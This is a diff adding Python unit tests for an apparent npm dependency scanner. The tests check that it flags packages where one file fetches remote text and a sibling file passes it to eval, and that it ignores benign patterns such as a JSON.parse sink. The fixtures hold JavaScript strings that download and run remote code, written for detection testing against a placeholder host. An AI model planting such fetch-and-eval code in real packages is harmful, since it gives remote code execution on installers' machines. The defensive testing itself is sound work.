@@ -535,5 +535,62 @@ class CrossFileReceivedTests(unittest.TestCase):
                             [(i["rule"], i["msg"]) for i in got]))
 
 
+def _npmfiles(mapping):
+    """{package-relative path: content} -> JS dependency file dicts under
+    node_modules (what the JS cross-file pass sees)."""
+    return [{"path": "node_modules/" + rel, "content": c, "lang": "js", "dep": True}
+            for rel, c in mapping.items()]
+
+
+class CrossFileReceivedJsTests(unittest.TestCase):
+    """The JS half of the cross-file follower: a value received in one file of an
+    npm package and run in another. Inert text only: hosts are .invalid."""
+
+    def _one(self, files):
+        return [(i["sev"], i["msg"]) for i in core._cross_file_received_issues(files)]
+
+    def test_run_across_files_fires(self):
+        for label, src, pkg in [
+            ("cjs named + then(eval)", "./fetcher", {
+                "jd/fetcher.js": "async function pull() { return (await fetch(" + U + ")).text(); }\n"
+                                 "module.exports = { pull };\n",
+                "jd/index.js": "const { pull } = require('./fetcher');\npull().then(c => eval(c));\n"}),
+            ("esm named + eval(await)", "./net.mjs", {
+                "je/net.mjs": "export async function grab() { return (await fetch(" + U + ")).text(); }\n",
+                "je/index.mjs": "import { grab } from './net.mjs';\neval(await grab());\n"}),
+            ("namespace require", "./h", {
+                "jn/h.js": "async function get(u) { return (await fetch(u)).text(); }\nmodule.exports = { get };\n",
+                "jn/index.js": "const h = require('./h');\nh.get(" + U + ").then(c => eval(c));\n"}),
+            ("default whole export", "./d", {
+                "jf/d.js": "async function load() { return (await fetch(" + U + ")).text(); }\nmodule.exports = load;\n",
+                "jf/index.js": "const p = require('./d');\np().then(c => eval(c));\n"}),
+        ]:
+            with self.subTest(label):
+                got = self._one(_npmfiles(pkg))
+                self.assertEqual(len(got), 1, got)
+                self.assertEqual(got[0][0], "MAJOR")
+                self.assertIn(REASON, got[0][1])
+                self.assertIn(src, got[0][1])
+
+    def test_what_does_not_fire_across_files(self):
+        # imported function returns a literal, and is not run
+        self.assertEqual(self._one(_npmfiles({
+            "jb/util.js": "function greet() { return 'hi'; }\nmodule.exports = { greet };\n",
+            "jb/index.js": "const { greet } = require('./util');\nconsole.log(greet());\n"})), [])
+        # an HTTP-client shape: fetches and returns received data across files, but
+        # the sink is JSON.parse, not a code-runner — the key false-positive guard
+        self.assertEqual(self._one(_npmfiles({
+            "jc/http.js": "async function get(u) { return (await fetch(u)).text(); }\nmodule.exports = { get };\n",
+            "jc/index.js": "const { get } = require('./http');\n"
+                           "module.exports.j = async (u) => JSON.parse(await get(u));\n"})), [])
+        # cross-package: a bare (non-relative) import is not a sibling
+        self.assertEqual(self._one(_npmfiles({
+            "pa/index.js": "const { pull } = require('pb');\neval(pull());\n",
+            "pa/x.js": "var x = 1;\n",
+            "pb/index.js": "async function pull() { return (await fetch(" + U + ")).text(); }\n"
+                           "module.exports = { pull };\n",
+            "pb/y.js": "var y = 1;\n"})), [])
+
+
 if __name__ == "__main__":
     unittest.main()
